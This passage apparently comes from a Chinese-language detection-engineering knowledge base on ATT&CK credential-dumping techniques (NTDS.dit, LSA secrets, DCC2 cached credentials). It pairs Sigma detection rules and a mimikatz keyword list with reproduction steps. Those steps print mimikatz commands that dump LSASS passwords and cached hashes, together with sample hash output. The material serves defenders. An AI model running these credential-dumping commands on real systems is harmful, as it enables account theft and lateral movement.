(*) \u68c0\u6d4b\u5230\u6570\u636e\u5e93\u4f4d\u7f6e\u4ece\u201cC:\\Windows\\NTDS\\ntds.dit\u201d\u66f4\u6539\u4e3a\u201c\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*1*\\Windows\\NTDS\\ntds.dit\u201d\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection7:\n        EventID: 302\n        Message: 'lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u5df2\u6210\u529f\u5b8c\u6210\u6062\u590d\u6b65\u9aa4\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n\u200b    timeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_6","title":"\u5efa\u8bae","text":"<p>\u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-003</p> <p>https://attack.mitre.org/techniques/T1003/003</p> <p>\u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6</p> <p>https://xz.aliyun.com/t/2187</p> <p>NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177</p> <p>https://www.secpulse.com/archives/6301.html</p> <p>MITRE ATT&amp;CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248</p> <p>https://hansight.github.io/#/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-004-windows-\u57fa\u4e8eLSA\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5177\u6709SYSTEM\u8bbf\u95ee\u4e3b\u673a\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u8bbf\u95ee\u672c\u5730\u5b89\u5168\u673a\u6784\uff08LSA\uff09\u673a\u5bc6\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u542b\u5404\u79cd\u4e0d\u540c\u7684\u51ed\u636e\u6750\u6599\uff0c\u4f8b\u5982\u670d\u52a1\u5e10\u6237\u7684\u51ed\u636e\u3002LSA\u673a\u5bc6\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2dHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\u3002LSA\u673a\u5bc6\u4e5f\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u3002</p> <p>Reg\u53ef\u7528\u4e8e\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u3002Mimikatz\u53ef\u7528\u4e8e\u4ece\u5185\u5b58\u4e2d\u63d0\u53d6\u79d8\u5bc6\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#lsalocal-security-authority","title":"LSA\uff08Local Security Authority\uff09","text":"<p>\u901a\u8fc7system\u6743\u9650\u8bbf\u95ee\u4e3b\u673alsass.exe\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u4ece\u4e2d\u8bfb\u53d6\u672c\u5730\u767b\u5f55\u548c\u57df\u767b\u5f55\u7684\u660e\u6587\u5bc6\u7801\u3002\u5f53\u670d\u52a1\u5728\u672c\u5730\u6216\u57df\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u65f6\uff0c\u5176\u5bc6\u7801\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002\u5982\u679c\u542f\u7528\u4e86\u81ea\u52a8\u767b\u5f55\uff0c\u5219\u6b64\u4fe1\u606f\u4e5f\u5c06\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002</p> <p>\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u5904\u7406Windows\u4e3b\u673a\u4e2d\u5b89\u5168\u7b56\u7565\u7684\u5b9e\u65bd\u3002\u5728\u4ece2000\u5230Server 2008\u7684Windows\u73af\u5883\u4e2d\uff0cLSASS\u8fdb\u7a0b\u7684\u5185\u5b58\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u4ee5\u652f\u6301WDigest\u548cSSP\u8eab\u4efd\u9a8c\u8bc1\u3002\u56e0\u6b64\uff0cMimikatz\u7b49\u5de5\u5177\u53ef\u4ee5\u8f7b\u677e\u68c0\u7d22\u5bc6\u7801\u3002\u81eaWindows 8.1\u548cWindows Server 2012\u7684Microsoft\u4e3a\u4e86\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u8fdb\u4e00\u6b65\u963b\u6b62\u4e86LSASS\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a</p> <ul> <li>pwdump.exe</li> <li>Mimikatz</li> <li>gsecdump</li> <li>\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7</li> </ul> <p>\u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528Creddump7\u6536\u96c6\u51ed\u636e\u3002</p> <p>\u6ce8\u610f\uff1a\u7531\u673a\u5236\u95ee\u9898\u63d0\u53d6\u7684\u5bc6\u7801\u662fUTF-16\u7f16\u7801\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u4ee5\u660e\u6587\u5f62\u5f0f\u8fd4\u56de.Windows 10\u589e\u52a0\u4e86\u5bf9\u7f13\u89e3\u4e2d\u63cf\u8ff0\u7684LSA\u79d8\u5bc6\u7684\u4fdd\u62a4</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>sysmon\u65e5\u5fd7</p> <p>windows security\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#lsassexeadministrator","title":"\u653b\u51fb\u65b9\u6cd5\uff1a\u4ecelsass.exe\u7a0b\u5e8f\u5185\u5b58\u4e2d\u8bfb\u53d6\u5bc6\u7801(administrator)","text":"<pre><code>C:\\mimikatz_trunk\\x64&gt;mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 246475 (00000000:0003c2cb)\nSession           : RemoteInteractive from 2\nUser Name         : 1.205\nDomain            : 1205-PC\nLogon Server      : 1205-PC\nLogon Time        : 2019/7/10 16:12:02\nSID               : S-1-5-21-4083414316-2806399370-2225847366-1000\n        msv :\n         [00000003] Primary\n         * Username : 1.205\n         * Domain   : 1205-PC\n         * LM       : 6ce1432e9b83da8da8eed815a197bd87\n         * NTLM     : 6136ba14352c8a09405bb14912797793\n         * SHA1     : b1ab7381d8e9799e407f1d4cb39e33b5d3e54f72\n        tspkg :\n         * Username : 1.205\n         * Domain   : 1205-PC\n         * Password : 1qazcde3!@#\n        wdigest :\n         * Username : 1.205\n         * Domain   : 1205-PC\n         * Password : 1qazcde3!@#\n        kerberos :\n         * Username : 1.205\n         * Domain   : 1205-PC\n         * Password : 1qazcde3!@\n        ssp :\n        credman :\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Mimikatz\u4f7f\u7528\ndescription: \u68c0\u6d4b\u5e38\u89c1\u7684mimikatz\u547d\u4ee4\u53c2\u6570\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\n    - attack.credential_access\nlogsource:\n    product: windows\ndetection:\n    keywords:\n        Message:\n        - \"* mimikatz *\"\n        - \"* mimilib *\"\n        - \"* &lt;3 eo.oe *\"\n        - \"* eo.oe.kiwi *\"\n        - \"* privilege::debug *\"\n        - \"* sekurlsa::logonpasswords *\"\n        - \"* lsadump::sam *\"\n        - \"* mimidrv.sys *\"\n        - \"* p::d *\"\n        - \"* s::l *\"\n    condition: keywords\nfalsepositives:\n    - Naughty administrators\n    - Penetration test\nlevel: critical\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u5bf9\u6570\u636e\u6e90\u8981\u6c42\u8f83\u9ad8\uff0c\u53ef\u9002\u7528\u8303\u56f4\u4e3a\uff1a2012\u53ca\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff1b\u90e8\u7f72sysmon\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-004</p> <p>https://attack.mitre.org/techniques/T1003/004</p> <p>pwdump7</p> <p>http://passwords.openwall.net/b/pwdump/pwdump7.zip</p> <p>powershell</p> <p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</p> <p>mimikatz wiki</p> <p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</p> <p>\u5173\u4e8e\u66f4\u591a\u8f6c\u50a8\u660e\u6587\u5bc6\u7801\u4f60\u53ef\u4ee5\u53c2\u8003</p> <p>https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-005-win-DCC2-mimikatz\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u7f13\u5b58\u7684\u57df\u51ed\u636e\uff0c\u8be5\u51ed\u636e\u7528\u4e8e\u5728\u57df\u63a7\u5236\u5668\u4e0d\u53ef\u7528\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p> <p>\u5728Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u54c8\u5e0c\u683c\u5f0f\u4e3aDCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\u54c8\u5e0c\uff0c\u4e5f\u79f0\u4e3aMS-Cache v2\u54c8\u5e0c\u3002\u9ed8\u8ba4\u7f13\u5b58\u51ed\u636e\u7684\u6570\u91cf\u5404\u4e0d\u76f8\u540c\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u53ef\u4ee5\u66f4\u6539\u3002\u8be5\u6563\u5217\u4e0d\u5141\u8bb8\u901a\u8fc7\u6563\u5217\u6837\u5f0f\u7684\u653b\u51fb\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528\u5bc6\u7801\u7834\u89e3\u6765\u6062\u590d\u7eaf\u6587\u672c\u5bc6\u7801\u3002</p> <p>\u901a\u8fc7SYSTEM\u8bbf\u95ee\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982Mimikatz\uff0cReg\u548csecretsdump.py\u4e4b\u7c7b\u7684\u5de5\u5177/\u5b9e\u7528\u7a0b\u5e8f\u6765\u63d0\u53d6\u7f13\u5b58\u7684\u51ed\u636e\u3002</p> <p>\u6ce8\u610f\uff1aWindows Vista\u7684\u7f13\u5b58\u51ed\u636e\u662f\u4f7f\u7528PBKDF2\u6d3e\u751f\u7684</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcc2domain-cached-credentials-version-2","title":"DCC2\uff08Domain Cached Credentials version 2\uff09","text":"<p>Domain Cached Credentials \u7b80\u79f0 DDC\u57df\u7f13\u5b58\u51ed\u636e\uff0c\u662f\u7f13\u5b58\u7684\u57df\u767b\u5f55\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u672c\u5730\u5b58\u50a8\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u7684windows\u6ce8\u518c\u8868\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u952e\u4e2d\u7684regedit\uff08\u4ee5SYSTEM\u7279\u6743\u8fd0\u884c\uff09\u6765\u67e5\u770b\u3002</p> <pre><code>HKEY_LOCAL_MACHINE\\SECURITY\\Cache\n</code></pre> <p>\u968f\u7740Windows Vista\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5e03\uff0cMicrosoft\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u54c8\u5e0c\u7b97\u6cd5\u6765\u751f\u6210\u8fd9\u4e9b\u57df\u7f13\u5b58\u7684\u51ed\u636e\u3002\u8fd9\u79cd\u65b0\u7b97\u6cd5\uff08\u5373DCC2\uff09\u5c06\u5bc6\u7801\u731c\u6d4b\u653b\u51fb\u7684\u6210\u672c\u63d0\u9ad8\u4e86\u51e0\u4e2a\u6570\u91cf\u7ea7\u3002</p> <p>DCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\uff0cWindows Vista\u548c\u66f4\u65b0\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u6b64\u7b97\u6cd5\u6765\u7f13\u5b58\u548c\u9a8c\u8bc1\u76f8\u5173\u670d\u52a1\u5668\uff08\u57df\u63a7\uff09\u4e0d\u53ef\u7528\u65f6\u7684\u8fdc\u7a0b\u51ed\u636e\u3002\u5b83\u6709\u8bb8\u591a\u5176\u4ed6\u540d\u79f0\uff0c\u5305\u62ec\u201c mscache2\u201d\u548c\u201c mscash2\u201d\uff08Microsoft CAched haSH\uff09\u3002\u5b83\u53d6\u4ee3\u4e86Windows \u65e9\u671f\u7248\u672c\u4e2d\u4f7f\u7528\u7684\u8f83\u5f31\u7684msdcc v1\u54c8\u5e0c\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5e76\u4e0d\u662f\u7279\u522b\u5f31\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4f7f\u7528\u4e86\u7528\u6237\u540d\u4f5c\u4e3a\u76d0\uff0c\u56e0\u6b64\u9664\u4e86\u9a8c\u8bc1\u73b0\u6709\u7684\u7f13\u5b58\u51ed\u636e\u4e4b\u5916\uff0c\u4e0d\u5e94\u5c06\u5176\u7528\u4e8e\u4efb\u4f55\u5176\u4ed6\u7528\u9014\u3002\u7b80\u5355\u6765\u8bf4\uff1a\u5b83\u662f\u7f13\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u672c\u5730\u6ce8\u518c\u8868\u4e2d\u7684\u57df\u51ed\u636e+\u57df\u6388\u6743\u4fe1\u606f\uff0c\u540e\u9762\u7b80\u79f0\u6388\u6743\u51ed\u636e\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u52a0\u5165\u4e86\u516c\u53f8\u7684\u529e\u516c\u57df\uff0c\u4f60\u4e00\u76f4\u4f7f\u7528\u57df\u8d26\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u800c\u4e0d\u662f\u672c\u5730\u8d26\u6237\u767b\u5f55\u3002\u4f60\u5229\u7528\u57df\u8d26\u6237\u767b\u5f55\u65f6\u6240\u8f93\u5165\u7684\u8d26\u6237\u5bc6\u7801\u7531\u57df\u63a7\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5f53\u57df\u63a7\u9a8c\u8bc1\u6210\u529f\u540e\u4f60\u53ef\u4ee5\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\uff1b\u4f46\u5f53\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u5904\u4e8e\u65ad\u7f51\u6216\u8005\u5728\u5176\u4ed6\u5730\u65b9\u529e\u516c\uff08\u975e\u516c\u53f8\u529e\u516c\u57df\u73af\u5883\uff09\u65f6\uff0c\u4f60\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u57df\u8d26\u6237\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u8fd9\u53f0\u7535\u8111\u6839\u672c\u65e0\u6cd5\u8fde\u63a5\u5230\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u57df\u8d26\u6237\u767b\u9646\u8fd9\u53f0\u7535\u8111\uff0c\u90a3\u8fd9\u4e2a\u65f6\u5019\u662f\u7531\u8c01\u6765\u8d1f\u8d23\u9a8c\u8bc1\u4f60\u8f93\u5165\u7684\u57df\u8d26\u53f7\u5bc6\u7801\u662f\u5426\u6b63\u786e\u5462\uff1f\u5c31\u662fMSCACHE\uff01\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#mscache","title":"MSCACHE\u5de5\u4f5c\u539f\u7406\u4ecb\u7ecd","text":"<p>\u5f53\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\u53ef\u4ee5\u8fde\u4e0a\u57df\u63a7\u7684\u65f6\u5019\uff0c\u4f60\u7528\u57df\u8d26\u53f7\u53bb\u767b\u9646\u8fd9\u53f0\u7ec8\u7aef\u6216\u5176\u4ed6\u8bbe\u5907\uff0c\u5728\u767b\u9646\u6210\u529f\u540e\uff08\u57df\u63a7\u9a8c\u8bc1\u4e86\u4f60\u7684\u8eab\u4efd\u540e\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u4f60\u7684\u6388\u6743\u51ed\u636e\u4ee5\u53ca\u6388\u6743\u4fe1\u606f\u4fdd\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u9762\u3002\u9ed8\u8ba4\u662f\u4fdd\u5b58 10 \u4e2a\u6388\u6743\u51ed\u636e\uff08\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u503c\u8fdb\u884c\u66f4\u6539\uff09\u3002\u5f53\u88ab\u4fdd\u5b58\u7684\u6388\u6743\u51ed\u636e\u5df2\u7ecf\u8d85\u8fc7 10 \u4e2a\u7684\u8bdd\uff0c\u65b0\u7684\u6388\u6743\u51ed\u636e\u4f1a\u8986\u76d6\u6389\u8001\u7684\u6388\u6743\u51ed\u636e\u3002</p> <p>\u6388\u6743\u51ed\u636e\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u8fd9\u4e9b\u7528\u6237\uff0c\u5728\u673a\u5668\u8fde\u4e0d\u4e0a\u57df\u63a7\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u767b\u9646\u8fd9\u53f0\u673a\u5668\uff08\u53ea\u80fd\u4ea4\u4e92\u5f0f\u767b\u9646\uff0c\u6bd4\u5982\u63a7\u5236\u53f0\u6216\u8fdc\u7a0b\u684c\u9762\u3002\u8fdc\u7a0b\u684c\u9762\u7684\u65f6\u5019\u8981\u6ce8\u610f\uff0c\u4e0d\u80fd\u4f7f\u7528\u5e26\u6709 NLA\uff08\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 \uff09 \u529f\u80fd\u7684 RDP \u5ba2\u6237\u7aef\uff0c\u8981\u7528\u8001\u7684\u6bd4\u5982 XP \u4e0a\u9ed8\u8ba4 RDP \u5ba2\u6237\u7aef\uff09\uff0c\u4f46\u662f\u6ca1\u6709\u88ab\u7f13\u5b58\u5728\u6ce8\u518c\u8868\u91cc\u7684\u7528\u6237\u662f\u65e0\u6cd5\u767b\u9646\u7684\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#nla","title":"\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA)","text":"<p>\u5728\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bNLA\u662f\u4ec0\u4e48\uff1f</p> <p>\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1 (NLA)  \u662f\u4e00\u9879\u65b0\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u5373\u5728\u60a8\u5efa\u7acb\u5b8c\u6574\u7684\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u524d\u5c31\u5b8c\u6210\u4e86\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u5e76\u663e\u793a\u767b\u5f55\u5c4f\u5e55\u3002\u5b83\u662f\u4e00\u9879\u66f4\u52a0\u5b89\u5168\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u53ef\u4ee5\u9632\u6b62\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53d7\u5230\u9ed1\u5ba2\u6216\u6076\u610f\u8f6f\u4ef6\u7684\u653b\u51fb\u3002NLA  \u7684\u4f18\u70b9\u662f\uff1a</p> <ul> <li>\u6700\u521d\u53ea\u9700\u8981\u5c11\u91cf\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8d44\u6e90\u3002\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4ec5\u4f7f\u7528\u6709\u9650\u7684\u8d44\u6e90\uff0c\u800c\u4e0d\u662f\u50cf\u5728\u5148\u524d\u7248\u672c\u4e2d\u542f\u52a8\u6574\u4e2a\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002  </li> <li>\u53ef\u4ee5\u901a\u8fc7\u964d\u4f4e\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff08\u5c1d\u8bd5\u9650\u5236\u6216\u963b\u6b62\u8bbf\u95ee Internet\uff09\u7684\u98ce\u9669\u63d0\u4f9b\u66f4\u9ad8\u7684\u5b89\u5168\u4fdd\u969c\u3002  </li> <li>\u4f7f\u7528\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u9632\u6b62\u6211\u4eec\u8fde\u63a5\u5230\u56e0\u6076\u610f\u76ee\u7684\u800c\u5b89\u88c5\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u3002</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#mscache-bootkey-lsa-key-nlkm-key","title":"MSCACHE \u89e3\u5bc6 - Bootkey, LSA Key, NLKM Key","text":"<p>\u6240\u4ee5\uff0c\u6211\u4eec\u8981\u60f3\u89e3\u5bc6 MSCACHE\uff0c\u8981\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>\u5f97\u5230 bootkey</li> <li>\u5229\u7528 bootkey \u89e3\u5bc6 LSA Key</li> <li>\u5229\u7528 LSA Key \u89e3\u5bc6 NLKM Key</li> <li>\u5229\u7528 NLKM Key \u89e3\u5bc6 MSCACHE</li> </ol> <p>\u4ee5\u4e0a\u5185\u5bb9\u5f15\u7528\u81ea\uff1ahttps://baijiahao.baidu.com/s?id=1611304657392579351</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aMSCACHE \u4fdd\u5b58\u7684\u662f DCC hash\uff0c\u800c\u5e76\u4e0d\u662f NTLM \u7684 HASH\u3002\u6240\u4ee5\u4f60\u5bfc\u51fa\u7684\u57df\u7f13\u5b58\u7684 hash \u662f\u4e0d\u80fd\u7528\u4e8e PTH \u7684\uff0c\u53ea\u80fd\u7528\u6765\u7834\u89e3\u3002\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u901a\u8fc7\u5185\u5b58\u6280\u672f\u68c0\u7d22SAM\u6587\u4ef6\uff1a</p> <ul> <li>pwdumpx.exe</li> <li>gsecdump</li> <li>mimikatz</li> <li>cachedump</li> <li>......</li> </ul> <p>\u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4eceRegistry\u6536\u96c6\u51ed\u636e\uff0c\u5728\u672c\u5730\u4f7f\u7528Creddump7\u8fdb\u884c\u7834\u89e3\u54c8\u5e0c\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528mimikatz\u8bfb\u53d6mscash\u5bc6\u7801\u54c8\u5e0c</p> <pre><code>mimikatz.exe  \"privilege::debug\"  \"token::whoami\" \"token::elevate\"   \"LSADUMP::Cache\"\n</code></pre> 